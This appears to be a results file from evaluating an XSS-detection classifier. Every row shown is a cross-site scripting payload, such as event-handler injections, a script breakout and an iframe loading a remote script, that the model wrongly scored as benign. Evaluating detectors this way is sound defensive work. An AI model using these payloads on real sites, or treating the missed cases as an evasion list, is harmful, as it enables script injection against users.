payload,true_label,predicted_label,probabilities,inference_time_ms
<param id=x tabindex=1 onfocusin=alert(1)></param>,1,0,"{'benign': 0.5999, 'malicious': 0.4001}",72.57520000001705
"<small onmouseup=""alert(1)"">test</small>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",97.71920000000023
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,1,0,"{'benign': 0.5949, 'malicious': 0.4051}",126.88040000000456
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",1,0,"{'benign': 0.5896, 'malicious': 0.4104}",69.06440000000202
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",1,0,"{'benign': 0.5944, 'malicious': 0.4056}",95.16600000000608
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",1,0,"{'benign': 0.6005, 'malicious': 0.3995}",201.60939999999528
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",1,0,"{'benign': 0.5899, 'malicious': 0.4101}",80.84909999999468
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",76.8276999999955
"<menuitem onmouseleave=""alert(1)"">test</menuitem>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",81.05199999999968
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",1,0,"{'benign': 0.5961, 'malicious': 0.4039}",98.00220000002469
"<area ondblclick=""alert(1)"">test</area>",1,0,"{'benign': 0.5864, 'malicious': 0.4136}",94.95699999999374
"<table onbeforecut=""alert(1)"" contenteditable>test</table>",1,0,"{'benign': 0.5964, 'malicious': 0.4036}",305.1729000000023
<dialog onpointerenter=alert(1)>XSS</dialog>,1,0,"{'benign': 0.6032, 'malicious': 0.3968}",279.2316000000028
"<kbd onmousemove=""alert(1)"">test</kbd>",1,0,"{'benign': 0.5878, 'malicious': 0.4122}",252.89770000000544
"<style>:target {color:red;}</style><colgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></colgroup>",1,0,"{'benign': 0.5964, 'malicious': 0.4036}",784.1310000000021
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,1,0,"{'benign': 0.5982, 'malicious': 0.4018}",143.84970000000408
"<img onmousedown=""alert(1)"">test</img>",1,0,"{'benign': 0.5892, 'malicious': 0.4108}",85.03239999998868
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,1,0,"{'benign': 0.6012, 'malicious': 0.3988}",127.72400000000061
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",1,0,"{'benign': 0.6065, 'malicious': 0.3935}",168.36769999997614
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",1,0,"{'benign': 0.5922, 'malicious': 0.4078}",118.52339999998662
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",1,0,"{'benign': 0.5989, 'malicious': 0.4011}",102.96700000000669
<main id=x tabindex=1 onactivate=alert(1)></main>,1,0,"{'benign': 0.5987, 'malicious': 0.4013}",87.03920000002086
<em onpointermove=alert(1)>XSS</em>,1,0,"{'benign': 0.5982, 'malicious': 0.4018}",68.89870000000542
"<cite onmouseup=""alert(1)"">test</cite>",1,0,"{'benign': 0.5877, 'malicious': 0.4123}",83.12760000001163
"<a oncut=""alert(1)"" contenteditable>test</a>",1,0,"{'benign': 0.5923, 'malicious': 0.4077}",112.71299999998519
<address onpointerenter=alert(1)>XSS</address>,1,0,"{'benign': 0.6021, 'malicious': 0.3979}",83.62470000000144
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationend=""alert(1)""></legend>",1,0,"{'benign': 0.6036, 'malicious': 0.3964}",97.07299999999464
<hgroup onpointerover=alert(1)>XSS</hgroup>,1,0,"{'benign': 0.6003, 'malicious': 0.3997}",89.49750000002155
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,1,0,"{'benign': 0.5947, 'malicious': 0.4053}",98.2625999999982
<image3 onpointerout=alert(1)>XSS</image3>,1,0,"{'benign': 0.603, 'malicious': 0.397}",96.39349999997648
"<fieldset draggable=""true"" ondragstart=""alert(1)"">test</fieldset>",1,0,"{'benign': 0.5927, 'malicious': 0.4073}",372.62759999998707
"<address onpaste=""alert(1)"" contenteditable>test</address>",1,0,"{'benign': 0.5949, 'malicious': 0.4051}",220.1240999999925
"<i draggable=""true"" ondragend=""alert(1)"">test</i>",1,0,"{'benign': 0.5931, 'malicious': 0.4069}",217.4267000000043
"<aside onmousedown=""alert(1)"">test</aside>",1,0,"{'benign': 0.5915, 'malicious': 0.4085}",338.15250000000674
"<frame onmouseleave=""alert(1)"">test</frame>",1,0,"{'benign': 0.5887, 'malicious': 0.4113}",439.82679999999164
"<command onmouseenter=""alert(1)"">test</command>",1,0,"{'benign': 0.5881, 'malicious': 0.4119}",339.06100000001516
"<BODY BACKGROUND=""javascript:alert('')"">",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",76.9436000000212
"<p onmouseout=""alert(1)"">test</p>",1,0,"{'benign': 0.5888, 'malicious': 0.4112}",89.73230000000854
"<code oncontextmenu=""alert(1)"">test</code>",1,0,"{'benign': 0.5948, 'malicious': 0.4052}",68.67739999998435
"<option onclick=""alert(1)"">test</option>",1,0,"{'benign': 0.5856, 'malicious': 0.4144}",89.0090999999984
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",1,0,"{'benign': 0.6017, 'malicious': 0.3983}",69.9098000000049
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",1,0,"{'benign': 0.6002, 'malicious': 0.3998}",86.83070000000725
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,1,0,"{'benign': 0.6003, 'malicious': 0.3997}",76.5282000000127
<base id=x tabindex=1 onactivate=alert(1)></base>,1,0,"{'benign': 0.5955, 'malicious': 0.4045}",84.93539999997779
"<legend draggable=""true"" ondragend=""alert(1)"">test</legend>",1,0,"{'benign': 0.5939, 'malicious': 0.4061}",88.07430000001659
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,1,0,"{'benign': 0.5945, 'malicious': 0.4055}",97.9671000000053
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,1,0,"{'benign': 0.5996, 'malicious': 0.4004}",88.17949999999541
"<acronym onmouseleave=""alert(1)"">test</acronym>",1,0,"{'benign': 0.588, 'malicious': 0.412}",61.428199999994604
"<span onbeforecut=""alert(1)"" contenteditable>test</span>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",53.24010000001067
</script><script>alert('');</script>,1,0,"{'benign': 0.5783, 'malicious': 0.4217}",48.897700000026134
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,1,0,"{'benign': 0.5981, 'malicious': 0.4019}",57.375300000018115
"<dir draggable=""true"" ondragend=""alert(1)"">test</dir>",1,0,"{'benign': 0.5909, 'malicious': 0.4091}",71.67309999999816
<custom tags onpointerleave=alert(1)>XSS</custom tags>,1,0,"{'benign': 0.5967, 'malicious': 0.4033}",50.06810000000428
"<ol oncontextmenu=""alert(1)"">test</ol>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",45.32839999998828
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",1,0,"{'benign': 0.6048, 'malicious': 0.3952}",60.304000000002134
"<main oncopy=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.5988, 'malicious': 0.4012}",44.45319999999242
<body onpointerup=alert(1)>XSS</body>,1,0,"{'benign': 0.5974, 'malicious': 0.4026}",42.38419999998655
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1,0,"{'benign': 0.5937, 'malicious': 0.4063}",47.653800000006186
"<base oncut=""alert(1)"" contenteditable>test</base>",1,0,"{'benign': 0.5918, 'malicious': 0.4082}",45.60480000000666
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",1,0,"{'benign': 0.6017, 'malicious': 0.3983}",68.46690000000422
"<tfoot onkeyup=""alert(1)"" contenteditable>test</tfoot>",1,0,"{'benign': 0.5958, 'malicious': 0.4042}",60.92909999998142
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strong>",1,0,"{'benign': 0.6075, 'malicious': 0.3925}",194.8404000000039
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",1,0,"{'benign': 0.5992, 'malicious': 0.4008}",100.718999999998
<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>,1,0,"{'benign': 0.5974, 'malicious': 0.4026}",73.32130000000348
<set onpointerover=alert(1)>XSS</set>,1,0,"{'benign': 0.5994, 'malicious': 0.4006}",56.23860000000036
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",1,0,"{'benign': 0.5975, 'malicious': 0.4025}",60.29310000002397
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",1,0,"{'benign': 0.5957, 'malicious': 0.4043}",56.87910000000329
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",61.49369999999976
"<caption onmousemove=""alert(1)"">test</caption>",1,0,"{'benign': 0.589, 'malicious': 0.411}",47.80110000001514
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1,0,"{'benign': 0.5957, 'malicious': 0.4043}",53.06770000001393
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></textarea>",1,0,"{'benign': 0.6066, 'malicious': 0.3934}",110.07720000000631
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></pre>",1,0,"{'benign': 0.6075, 'malicious': 0.3925}",105.148899999989
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",50.69290000000137
<dialog onpointerup=alert(1)>XSS</dialog>,1,0,"{'benign': 0.5979, 'malicious': 0.4021}",53.21179999998549
<svg id=x tabindex=1 onactivate=alert(1)></svg>,1,0,"{'benign': 0.5952, 'malicious': 0.4048}",67.99209999999789
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",1,0,"{'benign': 0.5983, 'malicious': 0.4017}",89.20929999999316
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meta>",1,0,"{'benign': 0.6081, 'malicious': 0.3919}",238.4362999999894
"<code onkeydown=""alert(1)"" contenteditable>test</code>",1,0,"{'benign': 0.5926, 'malicious': 0.4074}",71.66169999999283
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",1,0,"{'benign': 0.6046, 'malicious': 0.3954}",66.74759999998514
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,1,0,"{'benign': 0.6019, 'malicious': 0.3981}",122.26189999998383
<blink onpointerover=alert(1)>XSS</blink>,1,0,"{'benign': 0.5973, 'malicious': 0.4027}",68.87530000000197
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",1,0,"{'benign': 0.6035, 'malicious': 0.3965}",91.2004000000195
<li id=x tabindex=1 onfocusin=alert(1)></li>,1,0,"{'benign': 0.5986, 'malicious': 0.4014}",95.577899999995
"<mark onmousemove=""alert(1)"">test</mark>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",68.67890000000898
"<del onpaste=""alert(1)"" contenteditable>test</del>",1,0,"{'benign': 0.5925, 'malicious': 0.4075}",75.62759999999003
<tfoot onpointerover=alert(1)>XSS</tfoot>,1,0,"{'benign': 0.6007, 'malicious': 0.3993}",71.41760000001796
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1,0,"{'benign': 0.5901, 'malicious': 0.4099}",75.80509999999663
"<table onpaste=""alert(1)"" contenteditable>test</table>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",91.3314000000014
<ruby onpointerdown=alert(1)>XSS</ruby>,1,0,"{'benign': 0.5976, 'malicious': 0.4024}",169.09679999997707
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",1,0,"{'benign': 0.5886, 'malicious': 0.4114}",166.32180000001995
<content onpointerup=alert(1)>XSS</content>,1,0,"{'benign': 0.5958, 'malicious': 0.4042}",78.50399999998103
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",1,0,"{'benign': 0.6001, 'malicious': 0.3999}",206.4909000000057
<del onpointerout=alert(1)>XSS</del>,1,0,"{'benign': 0.6011, 'malicious': 0.3989}",56.72200000000771
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1,0,"{'benign': 0.5937, 'malicious': 0.4063}",69.01210000000901
<head onpointerover=alert(1)>XSS</head>,1,0,"{'benign': 0.5979, 'malicious': 0.4021}",61.78489999999215
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",1,0,"{'benign': 0.6012, 'malicious': 0.3988}",74.67809999999986
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></caption>",1,0,"{'benign': 0.5996, 'malicious': 0.4004}",83.19790000001603
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",82.1228000000076
"<label onmouseup=""alert(1)"">test</label>",1,0,"{'benign': 0.5886, 'malicious': 0.4114}",95.37290000000098
<svg><animate onend=alert(1) attributeName=x dur=1s>,1,0,"{'benign': 0.6, 'malicious': 0.4}",90.79209999998739
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",1,0,"{'benign': 0.6018, 'malicious': 0.3982}",144.21999999999002
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1,0,"{'benign': 0.5984, 'malicious': 0.4016}",114.26190000000247
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",1,0,"{'benign': 0.5998, 'malicious': 0.4002}",144.41439999998806
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,0,"{'benign': 0.6043, 'malicious': 0.3957}",124.19919999999252
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",138.53999999997768
<svg><bdo onload=alert(1)></bdo>,1,0,"{'benign': 0.5943, 'malicious': 0.4057}",94.43539999998052
"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",1,0,"{'benign': 0.5957, 'malicious': 0.4043}",77.76849999999058
"<blockquote onmouseup=""alert(1)"">test</blockquote>",1,0,"{'benign': 0.5904, 'malicious': 0.4096}",87.73990000000254
"<param onmouseleave=""alert(1)"">test</param>",1,0,"{'benign': 0.5882, 'malicious': 0.4118}",80.3575000000194
"<h1 onclick=""alert(1)"">test</h1>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",87.11929999998347
"<template onmouseup=""alert(1)"">test</template>",1,0,"{'benign': 0.5879, 'malicious': 0.4121}",63.67109999999343
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",1,0,"{'benign': 0.6046, 'malicious': 0.3954}",104.99620000001642
<svg><textarea onload=alert(1)></textarea>,1,0,"{'benign': 0.595, 'malicious': 0.405}",70.35119999997619
<th id=x tabindex=1 onactivate=alert(1)></th>,1,0,"{'benign': 0.5938, 'malicious': 0.4062}",73.65709999999126
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1,0,"{'benign': 0.6008, 'malicious': 0.3992}",66.30810000001475
<ins onpointermove=alert(1)>XSS</ins>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",61.867299999988745
"<details onclick=""alert(1)"">test</details>",1,0,"{'benign': 0.5877, 'malicious': 0.4123}",53.00850000000423
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",1,0,"{'benign': 0.5946, 'malicious': 0.4054}",64.55499999998437
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",1,0,"{'benign': 0.5906, 'malicious': 0.4094}",70.33780000000434
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,1,0,"{'benign': 0.5972, 'malicious': 0.4028}",111.01590000001238
"<noframes onmouseenter=""alert(1)"">test</noframes>",1,0,"{'benign': 0.5917, 'malicious': 0.4083}",78.3939000000089
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1,0,"{'benign': 0.6086, 'malicious': 0.3914}",139.46679999997968
<select onpointerout=alert(1)>XSS</select>,1,0,"{'benign': 0.5971, 'malicious': 0.4029}",74.10150000001181
"<embed onmouseover=""alert(1)"">test</embed>",1,0,"{'benign': 0.5889, 'malicious': 0.4111}",65.77150000001097
"<span oncopy=""alert(1)"" contenteditable>test</span>",1,0,"{'benign': 0.5941, 'malicious': 0.4059}",72.1008000000154
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",1,0,"{'benign': 0.5927, 'malicious': 0.4073}",93.9213000000052
<iframe src=http://.rocks/scriptlet.html <,1,0,"{'benign': 0.5956, 'malicious': 0.4044}",95.11489999999867
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",1,0,"{'benign': 0.6018, 'malicious': 0.3982}",108.65210000000047
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,1,0,"{'benign': 0.5983, 'malicious': 0.4017}",75.07620000001225
<multicol onpointerenter=alert(1)>XSS</multicol>,1,0,"{'benign': 0.6008, 'malicious': 0.3992}",78.53579999999738
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,1,0,"{'benign': 0.6023, 'malicious': 0.3977}",75.9762000000137
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1,0,"{'benign': 0.5945, 'malicious': 0.4055}",79.00999999998248
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",1,0,"{'benign': 0.6046, 'malicious': 0.3954}",71.00040000000263
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>",1,0,"{'benign': 0.6072, 'malicious': 0.3928}",80.73969999998099
"<bdi onmousedown=""alert(1)"">test</bdi>",1,0,"{'benign': 0.591, 'malicious': 0.409}",72.35430000000065
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",1,0,"{'benign': 0.5907, 'malicious': 0.4093}",63.77560000001381
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1,0,"{'benign': 0.5976, 'malicious': 0.4024}",70.44730000001209
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",1,0,"{'benign': 0.5928, 'malicious': 0.4072}",72.61589999998819
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",72.94129999999655
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",1,0,"{'benign': 0.604, 'malicious': 0.396}",101.89309999998386
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",1,0,"{'benign': 0.6014, 'malicious': 0.3986}",69.55070000000774
<body onpointerover=alert(1)>XSS</body>,1,0,"{'benign': 0.5988, 'malicious': 0.4012}",54.34170000000904
<code onpointerdown=alert(1)>XSS</code>,1,0,"{'benign': 0.5963, 'malicious': 0.4037}",50.200799999998935
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1,0,"{'benign': 0.5978, 'malicious': 0.4022}",74.93120000000886
